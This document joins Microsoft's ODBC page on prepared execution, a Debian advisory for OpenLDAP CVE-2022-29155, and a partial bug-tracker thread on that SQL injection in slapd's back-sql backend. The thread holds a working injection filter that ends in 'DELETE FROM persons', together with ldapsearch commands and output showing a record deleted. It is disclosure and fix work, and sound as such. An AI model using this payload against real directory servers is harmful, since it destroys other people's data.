# Prepared Execution ODBC

* Article

Feedback

## In this article

Prepared execution is an efficient way to execute a statement more than once. The statement is first compiled, or *prepared,* into an access plan. The access plan is then executed one or more times at a later time. For more information about access plans, see [Processing a SQL Statement](../processing-a-sql-statement?view=sql-server-ver16).

Prepared execution is commonly used by vertical and custom applications to repeatedly execute the same, parameterized SQL statement. For example, the following code prepares a statement to update the prices of different parts. It then executes the statement multiple times with different parameter values each time.

```
SQLREAL       Price;
SQLUINTEGER   PartID;
SQLINTEGER    PartIDInd = 0, PriceInd = 0;

// Prepare a statement to update salaries in the Employees table.
SQLPrepare(hstmt, "UPDATE Parts SET Price = ? WHERE PartID = ?", SQL_NTS);

// Bind Price to the parameter for the Price column and PartID to
// the parameter for the PartID column.
SQLBindParameter(hstmt, 1, SQL_PARAM_INPUT, SQL_C_FLOAT, SQL_REAL, 7, 0,
                  &Price, 0, &PriceInd);
SQLBindParameter(hstmt, 2, SQL_PARAM_INPUT, SQL_C_ULONG, SQL_INTEGER, 10, 0,
                  &PartID, 0, &PartIDInd);

// Repeatedly execute the statement.
while (GetPrice(&PartID, &Price)) {
   SQLExecute(hstmt);
}

```

Prepared execution is faster than direct execution for statements executed more than once, primarily because the statement is compiled only once; statements executed directly are compiled each time they are executed. Prepared execution also can provide a reduction in network traffic because the driver can send an access plan identifier to the data source each time the statement is executed, rather than an entire SQL statement, if the data source supports access plan identifiers.

The application can retrieve the metadata for the result set after the statement is prepared and before it is executed. However, returning metadata for prepared, unexecuted statements is expensive for some drivers and should be avoided by interoperable applications if possible. For more information, see [Result Set Metadata](result-set-metadata?view=sql-server-ver16).

Prepared execution should not be used for statements executed a single time. For such statements, it is slightly slower than direct execution because it requires an additional ODBC function call.

Important

Committing or rolling back a transaction, either by explicitly calling **SQLEndTran** or by working in auto-commit mode, causes some data sources to delete the access plans for all statements on a connection. For more information, see the SQL\_CURSOR\_COMMIT\_BEHAVIOR and SQL\_CURSOR\_ROLLBACK\_BEHAVIOR options in the [SQLGetInfo](../syntax/sqlgetinfo-function?view=sql-server-ver16) function description.

To prepare and execute a statement, the application:

1. Calls **SQLPrepare** and passes it a string containing the SQL statement.
2. Sets the values of any parameters. Parameters can actually be set before or after preparing the statement. For more information, see [Statement Parameters](statement-parameters?view=sql-server-ver16), later in this section.
3. Calls **SQLExecute** and does any additional processing that is necessary, such as fetching data.
4. Repeats steps 2 and 3 as necessary.
5. When **SQLPrepare** is called, the driver:

   * Modifies the SQL statement to use the data source's SQL grammar without parsing the statement. This includes replacing the escape sequences discussed in [Escape Sequences in ODBC](escape-sequences-in-odbc?view=sql-server-ver16). The application can retrieve the modified form of a SQL statement by calling **SQLNativeSql**. Escape sequences are not replaced if the SQL\_ATTR\_NOSCAN statement attribute is set.
   * Sends the statement to the data source for preparation.
   * Stores the returned access plan identifier for later execution (if the preparation succeeded) or returns any errors (if the preparation failed). Errors include syntactic errors such as SQLSTATE 42000 (Syntax error or access violation) and semantic errors such as SQLSTATE 42S02 (Base table or view not found).

     Note

     Some drivers do not return errors at this point but instead return them when the statement is executed or when catalog functions are called. Thus, **SQLPrepare** might appear to have succeeded when in fact it has failed.
6. When **SQLExecute** is called, the driver:

   * Retrieves the current parameter values and converts them as necessary. For more information, see [Statement Parameters](statement-parameters?view=sql-server-ver16), later in this section.
   * Sends the access plan identifier and converted parameter values to the data source.
   * Returns any errors. These are generally run-time errors such as SQLSTATE 24000 (Invalid cursor state). However, some drivers return syntactic and semantic errors at this point.

If the data source does not support statement preparation, the driver must emulate it to the extent possible. For example, the driver might do nothing when **SQLPrepare** is called and then perform direct execution of the statement when **SQLExecute** is called.

If the data source supports syntax checking without execution, the driver might submit the statement for checking when **SQLPrepare** is called and submit the statement for execution when **SQLExecute** is called.

If the driver cannot emulate statement preparation, it stores the statement when **SQLPrepare** is called and submits it for execution when **SQLExecute** is called.

Because emulated statement preparation is not perfect, **SQLExecute** can return any errors normally returned by **SQLPrepare**.

Package        : openldap
CVE ID         : CVE-2022-29155

Jacek Konieczny discovered a SQL injection vulnerability in the back-sql
backend to slapd in OpenLDAP, a free implementation of the Lightweight
Directory Access Protocol, allowing an attacker to alter the database
during an LDAP search operations when a specially crafted search filter
is processed.

For the oldstable distribution (buster), this problem has been fixed
in version 2.4.47+dfsg-3+deb10u7.

For the stable distribution (bullseye), this problem has been fixed in
version 2.4.57+dfsg-3+deb11u1.

We recommend that you upgrade your openldap packages.

For the detailed security status of openldap please refer to its
security tracker page at:
<https://security-tracker.debian.org/tracker/openldap>

I used it in my product, but then found a serious problem. It is enough to use a quote character to trigger SQL injection.

By using search filter "(sn='||upper\\28''\\29\\29;DELETE FROM persons;COMMIT;--)" I can remove data from the database, like this:  $ ldapsearch -H ldap://pve-jacek.pbx.axeos.cloud -D '' -b 'dc=example,dc=com' "(sn=Zinberstein)" # extended LDIF # # LDAPv3 # base <dc=example,dc=com> with scope subtree # filter: (sn=Zinberstein) # requesting: ALL #  # Akakiy Zinberstein, example.com dn: cn=Akakiy Zinberstein,dc=example,dc=com objectClass: inetOrgPerson objectClass: pkiUser cn: Akakiy Zinberstein sn: Zinberstein givenName: Akakiy userCertificate;binary:: MIIDazCCAtSgAwIBAgIBAjANBgkqhkiG9w0BAQQFADB3MQswCQYDV  [...]  # search reference ref: ldap://localhost:9012/dc=example,dc=com??sub  # search result search: 2 result: 0 Success  # numResponses: 3 # numEntries: 1 # numReferences: 1 jajcus@jajco:~$ ldapsearch -H ldap://pve-jacek.pbx.axeos.cloud -D '' -b 'dc=example,dc=com' "(sn='||upper\\28''\\29\\29;DELETE FROM persons;COMMIT;--)" # extended LDIF # # LDAPv3 # base <dc=example,dc=com> with scope subtree # filter: (sn='||upper\28''\29\29;DELETE FROM persons;COMMIT;--) # requesting: ALL #  # search reference ref: ldap://localhost:9012/dc=example,dc=com??sub  # search result search: 2 result: 0 Success  # numResponses: 2 # numReferences: 1 jajcus@jajco:~$ ldapsearch -H ldap://pve-jacek.pbx.axeos.cloud -D '' -b 'dc=example,dc=com' "(sn=Zinberstein)" # extended LDIF # # LDAPv3 # base <dc=example,dc=com> with scope subtree # filter: (sn=Zinberstein) # requesting: ALL #  # search reference ref: ldap://localhost:9012/dc=example,dc=com??sub  # search result search: 2 result: 0 Success  # numResponses: 2 # numReferences: 1 ```  [Comment 1](show_bug.cgi?id=9815#c1)  Howard Chu    2022-03-23 12:46:06 UTC  ``` Created [attachment 884](attachment.cgi?id=884 "Escape filter values") [[details]](attachment.cgi?id=884&action=edit "Escape filter values") Escape filter values  Thanks for the report.

Thanks for confirming.   Base DN, Bind DN - these are the same, they're the request DN. ```  [Comment 7](show_bug.cgi?id=9815#c7)  jajcus    2022-03-23 14:45:38 UTC  ``` Unfortunately, the patch does not work, as I suspected.  > ERROR:  syntax error at or near "\" at character 251  The patch escapes ' with backslash, but that is not a standard SQL string literal  quoting and does not work, at least for PostgreSQL.  Escaping ' as '' (doubling every single quote) should work better, probably for every SQL database. Yes, SQL quoting is weird. ```  [Comment 8](show_bug.cgi?id=9815#c8)  Howard Chu    2022-03-23 15:24:09 UTC  ``` Created [attachment 886](attachment.cgi?id=886 "additional patch") [[details]](attachment.cgi?id=886&action=edit "additional patch") additional patch  Try again then, with this second patch applied on top of the previous one. ```  [Comment 9](show_bug.cgi?id=9815#c9)  jajcus    2022-03-24 09:14:46 UTC  ``` A bit better now, but still not complete.

I'm not sure I understand why we have to go through attempting to escape arguments ourselves when we might be able to use SQLPrepare that should do the right thing(tm) whatever the input data?  <https://docs.microsoft.com/en-us/sql/odbc/reference/develop-app/prepared-execution-odbc>  I guess this might be because back-sql design would need to be overhauled. In that case we should immediately proclaim this backend as insecure, someone might still find a way to bypass whatever we've just patched sooner or later. If doing so prompts someone to adopt it or we just end up removing it remains to be seen, I don't mind either. ```  [Comment 13](show_bug.cgi?id=9815#c13)  Howard Chu    2022-03-28 15:51:07 UTC  ``` *** [Issue 6461](show_bug.cgi?id=6461 "VERIFIED DUPLICATE - back-sql quote characters in query") has been marked as a duplicate of this issue. *** ```  [Comment 15](show_bug.cgi?id=9815#c15)  Quanah Gibson-Mount    2022-04-11 16:39:35 UTC  ``` (In reply to jajcus from [comment #11](show_bug.cgi?id=9815#c11)) > Seems to be working properly now.
